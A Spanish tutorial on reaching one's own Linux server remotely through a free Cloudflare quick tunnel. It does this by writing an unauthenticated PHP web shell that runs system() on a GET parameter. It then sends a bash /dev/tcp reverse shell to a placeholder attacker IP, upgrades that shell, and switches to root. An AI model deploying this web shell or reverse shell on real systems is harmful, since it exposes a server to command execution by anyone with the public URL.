---
icon: cloudflare
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Exponer Puerto con Cloudflare Gratis

Si por ejemplo queremos exponer un puerto de forma gratuita para podernos conectar a nuestro servidor de `Linux` obteniendo una shell y pudiendo hacer lo que queramos desde cualquier parte del mundo, podremos realizar un truco.

En vez de pagar un dominio en `Cloudflare` para exponer el puerto `SSH` y conectarnos de forma remota, podremos exponer el puerto `80`, crear una pagina en `PHP` que nos permita inyectar comandos directamente en el servidor, para asi poder obtener una `reverse shell`, a todo esto le podemos poner una seguridad dentro del `PHP` como por ejemplo un `login` para que los usuarios que esten autenticados pueda generar una `reverse shell` desde la pagina web.

## Instalar cliente de Cloudflare

Lo que tendremos que hacer de primeras es instalar el cliente de `Cloudflare`, en mi caso lo hare en `Linux` desde esta pagina.

URL = [Pagina Cloudflare Downloads](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/#linux)

> NOTA IMPORTANTE

Para saber la arquitectura de nuestro sistema `Linux` podremos hacerlo con `uname -m` en la terminal, en mi caso me pone `x86_64` por lo que sabemos que seria `AMD x86_64`.

> Listado de arquitecturas de Sistema Linux

* `x86_64` → arquitectura **AMD64/Intel 64** (también llamado **x64**)
* `i686` o `i386` → arquitectura **32-bit x86**
* `aarch64` → arquitectura **ARM de 64 bits**
* `armv7l` → arquitectura **ARM de 32 bits**

Una vez descargado en mi caso seria el `.deb`, tendremos que ejecutar el siguiente comando para instalarlo.

```shell
dpkg -i <FILE>.deb
```

Una vez que se haya instalado (No deberia de tardar) podremos exponer un puerto `web` de la siguiente forma, pero antes de hacerlo tendremos que instalar `apache2`.

## Instalar/Configurar Servidor Web (apache2)

```shell
sudo apt update
sudo apt install apache2
```

Una vez instalado, vamos a iniciar el servicio de esta forma.

```shell
service apache2 start
systemctl enable apache2 #En tal caso de que tuvieramos la herramienta "systemctl"
```

Echo esto vamos añadir en la ruta donde se alojan las paginas web de `apache2` el siguiente archivo sencillo para podernos generar una `reverse shell`.

```shell
nano /var/www/html/index.php

#Dentro del nano
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
} else {
    echo "Usa ?cmd=comando para ejecutar.";
}
?>
```

Lo guardamos, le establecemos permisos de ejecuccion.

```shell
chmod +x /var/www/html/index.php
chown -R www-data:www-data /var/www/html/
sudo apt install apache2 php libapache2-mod-php -y
```

Ahora reiniciamos el servicio de `apache2`.

```shell
service apache2 restart
```

Echo esto ahora si vamos a exponer nuestro puerto `80` que es donde esta la pagina web de `apache2` de esta forma.

## Iniciar Cloudflare (Tunelización)

```shell
cloudflared tunnel --url http://localhost:80
```

Info:

```
2025-06-17T14:52:05Z INF Thank you for trying Cloudflare Tunnel. Doing so, without a Cloudflare account, is a quick way to experiment and try it out. However, be aware that these account-less Tunnels have no uptime guarantee, are subject to the Cloudflare Online Services Terms of Use (https://www.cloudflare.com/website-terms/), and Cloudflare reserves the right to investigate your use of Tunnels for violations of such terms. If you intend to use Tunnels in production you should use a pre-created named tunnel by following: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps
2025-06-17T14:52:05Z INF Requesting new quick Tunnel on trycloudflare.com...
2025-06-17T14:52:11Z INF +--------------------------------------------------------------------------------------------+
2025-06-17T14:52:11Z INF |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):  |
2025-06-17T14:52:11Z INF |  https://recording-phpbb-webmaster-cf.trycloudflare.com                                    |
2025-06-17T14:52:11Z INF +--------------------------------------------------------------------------------------------+
2025-06-17T14:52:11Z INF Version 2025.6.1 (Checksum <CHECKSUM>)
2025-06-17T14:52:11Z INF GOOS: linux, GOVersion: go1.24.2, GoArch: amd64
2025-06-17T14:52:11Z INF Settings: map[ha-connections:1 protocol:quic url:http://localhost:80]
2025-06-17T14:52:11Z INF cloudflared will not automatically update if installed by a package manager.
2025-06-17T14:52:11Z INF Generated Connector ID: <ID>
2025-06-17T14:52:11Z INF Initial protocol quic
2025-06-17T14:52:11Z INF ICMP proxy will use <IPv4> as source for IPv4
2025-06-17T14:52:11Z INF ICMP proxy will use <IPv6> in zone ens33 as source for IPv6
2025-06-17T14:52:11Z INF ICMP proxy will use <IPv4> as source for IPv4
2025-06-17T14:52:11Z INF ICMP proxy will use <IPv6> in zone ens33 as source for IPv6
2025-06-17T14:52:11Z INF Starting metrics server on 127.0.0.1:20241/metrics
2025-06-17T14:52:11Z INF Tunnel connection curve preferences: [X25519MLKEM768 CurveID(<CURVEID>) CurveP256] connIndex=0 event=0 ip=<IP_PUBLICA>
2025-06-17T14:52:11Z INF Registered tunnel connection connIndex=0 connection=<ID> event=0 ip=<IP_PUBLICA> location=mad02 protocol=quic
```

De toda esta informacion tendremos que quedarnos donde pone:

```
+--------------------------------------------------------------------------------------------+
2025-06-17T14:52:11Z INF |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):  |
2025-06-17T14:52:11Z INF |  https://recording-phpbb-webmaster-cf.trycloudflare.com                                    |
2025-06-17T14:52:11Z INF +--------------------------------------------------------------------------------------------+
```

En concreto donde empieza el `https://...` todo eso va a ser nuestro dominio `tunelizado` desde nuestro servidor local de `apache` por lo que cuando alguien se conecte de forma externa, como por ejemplo nosotros desde otro ordenador, lo que estaremos haciendo sera conectarnos a `http://localhost:80` de forma externa, por lo que si en un navegador ponemos...

```
URL = https://recording-phpbb-webmaster-cf.trycloudflare.com
```

Veremos nuestra interfaz de `apache2` por defecto ya que no eliminamos nuestro `index.html`, pero vamos a ir al archivo que hemos creado de `PHP`.

```
URL = https://recording-phpbb-webmaster-cf.trycloudflare.com/index.php?cmd=whoami
```

Info:

```
www-data
```

Veremos que esta funcionando, ahora si desde otro ordenador con un `kali linux` nos ponemos a la escucha con `nc` de esta forma.

## Obtener acceso a nuestro servidor por shell

```shell
nc -lvnp <IP>
```

Y desde la `URL` enviamos una `reverse shell` de esta forma.

```
URL = https://recording-phpbb-webmaster-cf.trycloudflare.com/index.php?cmd=bash -c "bash -i >%26 /dev/tcp/<IP_ATTACKER>/<PORT> 0>%261"
```

Lo enviamos y si volvemos a donde tenemos nuestra escucha veremos que habremos obtenido acceso como el usuario `www-data` por lo que sanitizaremos la `shell`.

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Una vez echo esto ya tendremos una `shell` bien sanitizada y habremos podido acceder a nuestro servidor de forma gratuita sin comprar ningun dominio en `Cloudflare`, ni exponer el puerto `SSH` de forma directa, solamente desde la `web`, ya solo tendremos que hacer.

```shell
su root
```

Meter la contraseña de `root` que hayamos puesto y listo, tendremos acceso al servidor como `root` desde cualquier parte del planeta.
